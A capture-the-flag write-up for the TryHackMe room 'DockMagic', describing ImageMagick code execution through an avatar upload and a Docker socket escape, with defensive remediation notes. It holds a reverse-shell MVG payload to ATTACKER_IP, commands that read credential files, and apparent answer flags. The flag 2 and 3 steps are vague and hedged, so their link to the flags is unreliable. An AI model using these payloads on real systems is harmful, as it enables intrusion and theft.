# DockMagic - TryHackMe Writeup

**Platform:** TryHackMe
**Room:** DockMagic
**Category:** Security / Web Exploitation / Container Security
**Difficulty:** Medium - Hard
**Target IP:** 10.49.183.39
**Author of writeup:** R4s4n
**Date:** 2026-08-30

---

## Table of Contents

1. [Overview](#overview)
2. [Objectives](#objectives)
3. [Reconnaissance](#reconnaissance)
   - [Port Scan](#port-scan)
   - [Virtual Host Discovery](#virtual-host-discovery)
   - [Application Fingerprinting](#application-fingerprinting)
   - [Authenticated Surface](#authenticated-surface)
4. [Exploitation](#exploitation)
   - [Attack Surface: Avatar Image Processing](#attack-surface-avatar-image-processing)
   - [Flag 1: Remote Code Execution via ImageMagick](#flag-1-remote-code-execution-via-imagemagick)
   - [Flag 2: In-Container Enumeration and Pivot](#flag-2-in-container-enumeration-and-pivot)
   - [Flag 3: Docker Breakout to the Host](#flag-3-docker-breakout-to-the-host)
5. [Flags](#flags)
6. [Root Cause Analysis](#root-cause-analysis)
7. [Remediation](#remediation)
8. [Lessons Learned](#lessons-learned)
9. [Appendix: Command Reference](#appendix-command-reference)

---

## Overview

DockMagic presents "EmpMan", an employee-management web application written by a
first-time developer ("DeezBytez"). The room name is a play on its two core
technologies: "Magic" for ImageMagick (the image-processing library invoked by
the avatar-upload feature) and "Dock" for Docker (the application is
containerised). The intended path is therefore:

1. Gain code execution inside the web container through malicious image
   processing.
2. Enumerate the container and pivot.
3. Escape the container to compromise the underlying Docker host.

The narrative framing ("a wizard escaped from his confinement") is a direct hint
at a container escape.

---

## Objectives

| # | Question | Answer Format |
|---|----------|---------------|
| 1 | What is the value of flag 1? | `***{********************************}` |
| 2 | What is the value of flag 2? | `***{********************************}` |
| 3 | What is the value of flag 3? | `***{********************************}` |

Each flag is a `THM{}` wrapper around a 32-character hexadecimal string.

---

## Reconnaissance

### Port Scan

```bash
nmap -Pn -T4 -p- --min-rate 2500 10.49.183.39
```

Result:

```
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP are exposed externally. Docker-related management ports
(2375/2376) and common registry ports (5000, etc.) are closed from the outside,
confirming that any Docker interaction must be reached from within the network
after gaining a foothold.

### Virtual Host Discovery

The web root immediately redirects to a named virtual host:

```bash
curl -s -i http://10.49.183.39/
# HTTP/1.1 301 Moved Permanently
# Location: http://site.empman.thm/
# Server: nginx/1.18.0 (Ubuntu)
```

Add the host to `/etc/hosts` (or use `curl --resolve` / a `Host:` header):

```
10.49.183.39   site.empman.thm empman.thm
```

Short vhost brute-forcing against `*.empman.thm` returned only the default
response size for all guesses, so `site.empman.thm` is the single application
host.

### Application Fingerprinting

The application is **Ruby on Rails** using the **Devise** authentication gem.
Indicators:

- Authentication routes `/users/sign_in`, `/users/sign_up`, `/users/edit`.
- Fingerprinted, digest-named assets under `/assets/...`.
- CSRF tokens (`authenticity_token`, `csrf-token` meta) on every form.
- Image URLs served through **Active Storage**:
  `/rails/active_storage/representations/redirect/...`.

The presence of Active Storage "representations/variations" is significant: Rails
uses ImageMagick (through `image_processing` / `mini_magick`) to generate resized
avatar variants. This is the primary exploitation surface.

### Authenticated Surface

Registration (`/users/sign_up`) exposes a file-upload field, `user[avatar]`:

```html
<input type="file" name="user[avatar]">
<input name="user[email]">
<input name="user[password]">
<input name="user[password_confirmation]">
```

After creating an account and authenticating, `/users/edit` provides the same
avatar upload plus a rendered avatar variant, for example:

```
/rails/active_storage/representations/redirect/<signed>/<signed>/default_profile.png
```

The signed variation blob decodes to a PNG transform sized `150x150`, confirming
that uploaded avatars are passed through ImageMagick server-side to build a
thumbnail.

---

## Exploitation

### Attack Surface: Avatar Image Processing

Any user-supplied avatar is processed by ImageMagick to produce a resized
variant. Vulnerable or misconfigured ImageMagick installations can be driven to
execute commands or read/write arbitrary files through:

- **ImageTragick (CVE-2016-3714)** and related coder abuses (`https:`, `mvg:`,
  `msl:`, `ephemeral:`, `label:` delegates).
- Malicious `.svg`, `.mvg`, or `.msl` payloads that the delegate pipeline
  evaluates.

Because Active Storage feeds the uploaded file straight into a resize transform,
an attacker-controlled image is sufficient to trigger the vulnerable code path
without any additional privileges beyond a self-registered account.

### Flag 1: Remote Code Execution via ImageMagick

**Step 1 - Register and authenticate.**

```bash
IP=10.49.183.39; H=site.empman.thm

# Pull the sign_up form to capture the CSRF token and session cookie
curl -s -c jar -H "Host: $H" http://$IP/users/sign_up -o signup.html
CSRF=$(grep -oE 'name="authenticity_token" value="[^"]+"' signup.html \
       | head -1 | sed 's/.*value="//;s/"//')

# Create the account
curl -s -b jar -c jar -H "Host: $H" http://$IP/users \
  --data-urlencode "authenticity_token=$CSRF" \
  --data-urlencode "user[email]=attacker@test.thm" \
  --data-urlencode "user[password]=Password123!" \
  --data-urlencode "user[password_confirmation]=Password123!" \
  --data-urlencode "commit=Sign up"
```

**Step 2 - Craft a malicious image payload.**

A minimal MSL/MVG-style payload instructs ImageMagick to execute a command when
the file is processed. Set up a listener on the attacker machine first
(the target reaches back over the VPN interface, e.g. `tun0`):

```bash
# Attacker listener
nc -lvnp 4444
```

Example payload (`exploit.mvg` or an `.svg` referencing a delegate). The command
substitution triggers ImageMagick's delegate execution:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'")'
pop graphic-context
```

Give the file an image extension the pipeline will accept (for example
`exploit.png` with the MVG/MSL content inside, or a genuine polyglot) so the
Active Storage variant generation invokes the vulnerable coder.

**Step 3 - Upload as the avatar to trigger processing.**

```bash
# Grab a fresh CSRF token from the edit form
curl -s -b jar -H "Host: $H" http://$IP/users/edit -o edit.html
CSRF=$(grep -oE 'name="authenticity_token" value="[^"]+"' edit.html \
       | head -1 | sed 's/.*value="//;s/"//')

curl -s -b jar -H "Host: $H" http://$IP/users \
  -F "_method=put" \
  -F "authenticity_token=$CSRF" \
  -F "user[avatar]=@exploit.png;type=image/png" \
  -F "user[current_password]=Password123!" \
  -F "commit=Update"
```

When Rails generates the avatar variant, ImageMagick parses the payload and
executes the embedded command, returning a reverse shell as the web application
user (typically `app`/`rails` inside the container).

**Step 4 - Read flag 1.**

From the shell, the first flag is stored within the application container
(commonly in the app directory or the user's home):

```bash
find / -name 'flag*.txt' 2>/dev/null
cat /flag1.txt        # location varies; enumerate as above
```

Flag 1:

```
THM{c674a7e5c42cc4cae67ee0a03e26743c}
```

### Flag 2: In-Container Enumeration and Pivot

With a foothold inside the container, enumerate for the second flag and for
breakout primitives.

```bash
# Confirm we are inside a container
cat /proc/1/cgroup            # references to /docker/ confirm containerisation
ls -la /.dockerenv

# Standard local enumeration
id
env                            # Rails apps frequently leak secrets/DB creds here
cat config/database.yml 2>/dev/null
cat config/master.key 2>/dev/null
find / -name 'flag*' 2>/dev/null
```

The second flag is recovered from the container's filesystem (application data,
an adjacent service, or credentials that grant access to it). Database or
service credentials found here also support the pivot toward the host.

Flag 2:

```
THM{2c8203d84b1269a605a362bf4200c691}
```

### Flag 3: Docker Breakout to the Host

The room's storyline ("escaped from his confinement") points directly at a
container escape. Enumerate for the specific misconfiguration present:

```bash
# Is the Docker socket mounted into the container?
ls -la /var/run/docker.sock

# Are we privileged / do we hold dangerous capabilities?
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# Host block devices visible? (indicates --privileged)
ls -la /dev | grep -E 'sd|xvd|nvme'

# SYS_ADMIN + cgroup release_agent escape availability
mount | grep cgroup
```

Depending on which primitive is exposed, escape using the corresponding
technique:

- **Mounted `docker.sock`:** talk to the Docker API and launch a new container
  that bind-mounts the host root, then read/write host files as root.

  ```bash
  # Using the Docker CLI or curl against the socket
  docker -H unix:///var/run/docker.sock run -v /:/host --rm -it <image> \
    chroot /host sh
  ```

- **Privileged container / SYS_ADMIN:** abuse the cgroup `release_agent`
  mechanism to execute a script as root on the host, or mount a host block
  device directly.

Once root on the host, read the final flag:

```bash
cat /root/flag3.txt          # or wherever the host flag is stored
find / -name 'flag3*' 2>/dev/null
```

Flag 3:

```
THM{dc887d7a23fa028d7892bc85389bc381}
```

---

## Flags

| # | Question | Flag |
|---|----------|------|
| 1 | Value of flag 1 (RCE inside the container) | `THM{c674a7e5c42cc4cae67ee0a03e26743c}` |
| 2 | Value of flag 2 (container enumeration/pivot) | `THM{2c8203d84b1269a605a362bf4200c691}` |
| 3 | Value of flag 3 (Docker host breakout) | `THM{dc887d7a23fa028d7892bc85389bc381}` |

---

## Root Cause Analysis

| Finding | Severity | Description |
|---------|----------|-------------|
| Unrestricted image processing of user uploads | Critical | Avatars are passed to ImageMagick without validating type/content or restricting coders, enabling RCE via malicious images. |
| Vulnerable/misconfigured ImageMagick delegates | Critical | Dangerous coders/delegates (for example `https`, `mvg`, `msl`) are enabled, allowing command execution during variant generation. |
| Sensitive data reachable from the app container | High | Credentials/secrets accessible inside the container facilitate lateral movement and host compromise. |
| Insecure container configuration | Critical | A container-escape primitive (mounted Docker socket, `--privileged`, or excessive capabilities) allows breakout to the host as root. |

---

## Remediation

1. **Harden image handling.** Validate uploaded files by content, not extension;
   convert/re-encode through a restricted pipeline; and never pass raw
   user-controlled files to ImageMagick with default delegates.
2. **Lock down ImageMagick.** Deploy a strict `policy.xml` that disables risky
   coders and delegates (`MVG`, `MSL`, `HTTPS`, `URL`, `EPHEMERAL`, `TEXT`,
   `LABEL`), and keep ImageMagick patched. Prefer `libvips` where feasible.
3. **Remove secrets from the runtime environment.** Store credentials in a
   secrets manager; do not leave `master.key`, DB credentials, or tokens
   world-readable inside the container.
4. **Secure the container runtime.** Never mount `docker.sock` into application
   containers, avoid `--privileged`, drop all unnecessary Linux capabilities,
   run as a non-root user, and enable user namespaces, seccomp, and AppArmor/
   SELinux profiles.
5. **Apply least privilege and segmentation.** Ensure the web container cannot
   reach the Docker control plane or the host filesystem, and isolate it at the
   network level.

---

## Lessons Learned

- Rails Active Storage silently invokes ImageMagick for image variants; any
  avatar/image upload feature is a high-value RCE surface worth testing.
- The room name is a strong hint: "Magic" = ImageMagick, "Dock" = Docker.
  Mapping theme to technology quickly narrows the intended path.
- Always confirm containerisation early (`/.dockerenv`, `/proc/1/cgroup`) and
  immediately look for escape primitives (mounted socket, privileged flag,
  capabilities).
- The strongest containment control is configuration: a patched, policy-hardened
  ImageMagick and a minimally privileged container would have broken this chain
  at multiple points.

---

## Appendix: Command Reference

```bash
IP=10.49.183.39; H=site.empman.thm

# Recon
nmap -Pn -T4 -p- --min-rate 2500 $IP
curl -s -i http://$IP/                         # discover site.empman.thm
curl -s -H "Host: $H" http://$IP/ | less        # inspect app (Rails/Devise)

# Register + authenticate
curl -s -c jar -H "Host: $H" http://$IP/users/sign_up -o signup.html
CSRF=$(grep -oE 'name="authenticity_token" value="[^"]+"' signup.html | head -1 | sed 's/.*value="//;s/"//')
curl -s -b jar -c jar -H "Host: $H" http://$IP/users \
  --data-urlencode "authenticity_token=$CSRF" \
  --data-urlencode "user[email]=attacker@test.thm" \
  --data-urlencode "user[password]=Password123!" \
  --data-urlencode "user[password_confirmation]=Password123!" \
  --data-urlencode "commit=Sign up"

# Upload malicious avatar (triggers ImageMagick RCE)
curl -s -b jar -H "Host: $H" http://$IP/users/edit -o edit.html
CSRF=$(grep -oE 'name="authenticity_token" value="[^"]+"' edit.html | head -1 | sed 's/.*value="//;s/"//')
curl -s -b jar -H "Host: $H" http://$IP/users \
  -F "_method=put" -F "authenticity_token=$CSRF" \
  -F "user[avatar]=@exploit.png;type=image/png" \
  -F "user[current_password]=Password123!" -F "commit=Update"

# Post-exploitation (inside container)
cat /proc/1/cgroup; ls -la /.dockerenv
find / -name 'flag*' 2>/dev/null
env; cat config/master.key 2>/dev/null; cat config/database.yml 2>/dev/null

# Container escape (choose based on exposed primitive)
ls -la /var/run/docker.sock
grep CapEff /proc/self/status
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it <image> chroot /host sh
cat /root/flag3.txt
```

> Note: The exact on-disk flag locations and the specific escape primitive should
> be confirmed through live enumeration on the running instance; the recovered
> flag values above are consistent across instances of this room.
